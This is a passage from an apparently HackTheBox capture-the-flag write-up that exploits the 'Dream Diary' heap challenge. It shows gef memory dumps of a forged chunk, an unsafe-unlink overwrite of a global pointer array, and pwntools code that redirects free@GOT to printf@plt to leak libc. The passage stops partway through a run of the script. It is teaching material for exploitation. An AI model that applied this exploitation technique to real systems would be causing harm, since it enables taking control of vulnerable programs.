</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">Starting</span> <span class="no">program</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">chapter1</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">PID</span> <span class="mi">2777</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Analyzing</span> <span class="err">/</span><span class="no">media</span><span class="err">/</span><span class="no">sf_Pwning</span><span class="err">/</span><span class="no">HackTheBox</span><span class="err">/</span><span class="no">chapter1</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Analyzing</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">vagrant</span><span class="err">/</span><span class="no">tools</span><span class="err">/</span><span class="no">LibcSearcher</span><span class="err">/</span><span class="no">libc-database</span><span class="err">/</span><span class="no">db</span><span class="err">/</span><span class="no">libc6_2.23-0ubuntu10_amd64.so</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Created</span> <span class="mi">5</span> <span class="no">chunks</span> <span class="no">of</span> <span class="no">size</span><span class="p">:</span> <span class="mi">0x88</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Paused</span> <span class="p">[</span><span class="no">Press</span> <span class="no">any</span> <span class="no">key</span> <span class="no">to</span> <span class="no">continue</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Preparing</span> <span class="no">a</span> <span class="no">fake</span> <span class="no">chunk...</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Fake</span> <span class="no">chunk</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000000:</span>  <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>  <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>  <span class="err">|</span><span class="na">................</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000010:</span>  <span class="nf">c0</span> <span class="mi">20</span> <span class="mi">60</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="no">c8</span> <span class="mi">20</span> <span class="mi">60</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="err">|</span><span class="p">.</span> <span class="err">`</span><span class="no">......</span> <span class="err">`</span><span class="no">.....</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000020:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000030:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000040:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000050:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000060:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000070:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000080:</span>  <span class="err">80</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>                           <span class="err">|</span><span class="na">........</span><span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Editing</span> <span class="no">chunk</span> <span class="mi">3</span> <span class="no">with</span> <span class="no">a</span> <span class="no">fakr</span> <span class="no">chunk</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="na">..snip..</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">heap</span> <span class="no">chunks</span>
</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x230a010</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x000000000230a010</span>     <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span>    <span class="no">AAAAAAAAAAAAAAAA</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x230a0a0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x000000000230a0a0</span>     <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span>    <span class="no">BBBBBBBBBBBBBBBB</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x230a130</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x000000000230a130</span>     <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span>    <span class="no">CCCCCCCCCCCCCCCC</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x230a1c0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x000000000230a1c0</span>     <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="no">................</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x230a250</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x000000000230a250</span>     <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span>    <span class="no">EEEEEEEEEEEEEEEE</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">49</span><span class="no">xg</span> <span class="mi">0x230a1c0</span> <span class="p">-</span> <span class="mi">0x10</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a1b0:</span>	<span class="err">0</span><span class="nf">x4343434343434343</span>	<span class="mi">0x0000000000000091</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a1c0:</span>	<span class="err">0</span><span class="nf">x0000000000000000</span>	<span class="mi">0x0000000000000000</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a1d0:</span>	<span class="err">0</span><span class="nf">x00000000006020c0</span>	<span class="mi">0x00000000006020c8</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a1e0:</span>	<span class="err">0</span><span class="nf">x5858585858585858</span>	<span class="mi">0x5858585858585858</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a1f0:</span>	<span class="err">0</span><span class="nf">x5858585858585858</span>	<span class="mi">0x5858585858585858</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a200:</span>	<span class="err">0</span><span class="nf">x5858585858585858</span>	<span class="mi">0x5858585858585858</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a210:</span>	<span class="err">0</span><span class="nf">x5858585858585858</span>	<span class="mi">0x5858585858585858</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a220:</span>	<span class="err">0</span><span class="nf">x5858585858585858</span>	<span class="mi">0x5858585858585858</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a230:</span>	<span class="err">0</span><span class="nf">x5858585858585858</span>	<span class="mi">0x5858585858585858</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a240:</span>	<span class="err">0</span><span class="nf">x0000000000000080</span>	<span class="mi">0x0000000000000090</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a250:</span>	<span class="err">0</span><span class="nf">x4545454545454545</span>	<span class="mi">0x4545454545454545</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a260:</span>	<span class="err">0</span><span class="nf">x4545454545454545</span>	<span class="mi">0x4545454545454545</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a270:</span>	<span class="err">0</span><span class="nf">x4545454545454545</span>	<span class="mi">0x4545454545454545</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a280:</span>	<span class="err">0</span><span class="nf">x4545454545454545</span>	<span class="mi">0x4545454545454545</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a290:</span>	<span class="err">0</span><span class="nf">x4545454545454545</span>	<span class="mi">0x4545454545454545</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a2a0:</span>	<span class="err">0</span><span class="nf">x4545454545454545</span>	<span class="mi">0x4545454545454545</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a2b0:</span>	<span class="err">0</span><span class="nf">x4545454545454545</span>	<span class="mi">0x4545454545454545</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a2c0:</span>	<span class="err">0</span><span class="nf">x4545454545454545</span>	<span class="mi">0x4545454545454545</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a2d0:</span>	<span class="err">0</span><span class="nf">x4545454545454545</span>	<span class="mi">0x0000000000020d31</span>
</span></span></code></pre></div><p>Here, the our forged chunk is within the 3rd chunk, our <code>fd</code> points to the <code>0x6020c0</code> and the <code>bk</code> to the <code>0x6020c8</code>, this aside, then we modified the <code>prev_size</code> of the chunk <code>0x230a1c0</code> to the <code>0x80</code> as it was <code>0x90</code> before, we did this because, our forged chunk must be considered from the <code>0x230a1c0</code> as from the we have an actual free&rsquo;d chunk structure, then we made <code>prev_inuse</code> bit of the chunk <code>0x230a250</code> equal to the <code>0</code> to consider the chunk as a free&rsquo;d chunk, so when we try to do <code>free(chunk4)</code> it&rsquo;ll consolidate the adjacent chunks, hence doing an unsafe unlink, resulting in the <code>fd</code> of the free&rsquo;d chunk pointing to the <code>0x6020c0</code>.</p>
<p>Let&rsquo;s free the chunk 4 and see the memory content to make this more clear.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span> <span class="err">[08:53:07]</span> <span class="nf">vagrant@oracle</span><span class="p">(</span><span class="no">oracle</span><span class="p">)</span> <span class="no">HackTheBox</span><span class="err">&gt;</span> <span class="no">python3</span> <span class="no">chapter1.py</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">Starting</span> <span class="no">program</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">chapter1</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">PID</span> <span class="mi">2978</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Analyzing</span> <span class="err">/</span><span class="no">media</span><span class="err">/</span><span class="no">sf_Pwning</span><span class="err">/</span><span class="no">HackTheBox</span><span class="err">/</span><span class="no">chapter1</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Analyzing</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">vagrant</span><span class="err">/</span><span class="no">tools</span><span class="err">/</span><span class="no">LibcSearcher</span><span class="err">/</span><span class="no">libc-database</span><span class="err">/</span><span class="no">db</span><span class="err">/</span><span class="no">libc6_2.23-0ubuntu10_amd64.so</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Created</span> <span class="mi">5</span> <span class="no">chunks</span> <span class="no">of</span> <span class="no">size</span><span class="p">:</span> <span class="mi">0x88</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Preparing</span> <span class="no">a</span> <span class="no">fake</span> <span class="no">chunk...</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Fake</span> <span class="no">chunk</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000000:</span>  <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>  <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>  <span class="err">|</span><span class="na">................</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000010:</span>  <span class="nf">c0</span> <span class="mi">20</span> <span class="mi">60</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="no">c8</span> <span class="mi">20</span> <span class="mi">60</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="err">|</span><span class="p">.</span> <span class="err">`</span><span class="no">......</span> <span class="err">`</span><span class="no">.....</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000020:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000030:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000040:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000050:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000060:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000070:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">    <span class="err">00000080:</span>  <span class="err">80</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>  <span class="err">90</span>                       <span class="err">|</span><span class="na">.........</span><span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Editing</span> <span class="no">chunk</span> <span class="mi">3</span> <span class="no">with</span> <span class="no">a</span> <span class="no">fakr</span> <span class="no">chunk</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Triggering</span> <span class="no">Unlink</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
</span></span><span class="line"><span class="cl"><span class="nf">Done</span><span class="p">!</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>         <span class="nf">Dream</span> <span class="no">Diary</span>          <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[1]</span> <span class="nf">Allocate</span>                 <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[2]</span> <span class="nf">Edit</span>                     <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[3]</span> <span class="nf">Delete</span>                   <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">[4]</span> <span class="nf">Exit</span>                     <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">+------------------------------+</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="na">..snip..</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">heap</span> <span class="no">chunks</span>
</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x2236010</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x0000000002236010</span>     <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span>    <span class="no">AAAAAAAAAAAAAAAA</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x22360a0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x00000000022360a0</span>     <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span>    <span class="no">BBBBBBBBBBBBBBBB</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x2236130</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x0000000002236130</span>     <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span>    <span class="no">CCCCCCCCCCCCCCCC</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x22361c0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x00000000022361c0</span>     <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">41</span> <span class="mi">0</span><span class="no">e</span> <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="no">........A.......</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">10</span><span class="no">xg</span> <span class="mi">0x6020c0</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x6020c0:</span>	<span class="err">0</span><span class="nf">x0000000002236010</span>	<span class="mi">0x00000000022360a0</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x6020d0:</span>	<span class="err">0</span><span class="nf">x0000000002236130</span>	<span class="mi">0x00000000006020c0</span>
</span></span></code></pre></div><p>Now as we see the global array having a pointer to itself on index 3, this means that the chunk 3 is now pointing to the global array itself, let&rsquo;s see what happened under the hood when we did <code>free(4)</code>, I will break it down in following steps:-</p>
<ul>
<li>There was a forged free&rsquo;d chunk with the <code>fd</code> and <code>bk</code> pointing to the global array.</li>
<li>When the <code>free(4)</code> is called and the chunk <code>4</code> was initally freed and the forged chunk was coalesced with the chunk <code>4</code>.</li>
<li>Once coalesced, the unlink is triggered resulting in the 3rd chunk pointer in the global array being overwritten with the address we wanted it to.</li>
</ul>
<p>Now, we have the control over the chunk <code>3</code>, we can edit it and get the other pointer overwritten too, if we could overwrite one of the entry with any GOT address, we can get the control over the binary.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Changing freegot to print@plt for LIBC Leak&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">(</span><span class="s2">&#34;free&#34;</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">(</span><span class="s2">&#34;printf&#34;</span><span class="p">)))</span>
</span></span></code></pre></div><p>So, from the code above you can see, first we overwrite the pointer returned by the chunk <code>3</code> which would be the global array itself, then we request for the first chunk via the <code>edit</code> function and since the 0th chunk address point to the <code>free@got</code>, we get the pointer of <code>free@GOT</code> and then it is being overwritten with the <code>printf@plt</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span>  <span class="err">[13:09:56]</span> <span class="nf">vagrant@oracle</span><span class="p">(</span><span class="no">oracle</span><span class="p">)</span> <span class="no">HackTheBox</span><span class="err">&gt;</span> <span class="no">python3</span> <span class="no">chapter1.py</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">Starting</span> <span class="no">program</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">chapter1</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">PID</span> <span class="mi">1985</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Analyzing</span> <span class="err">/</span><span class="no">media</span><span class="err">/</span><span class="no">sf_Pwning</span><span class="err">/</span><span class="no">HackTheBox</span><span class="err">/</span><span class="no">chapter1</span>
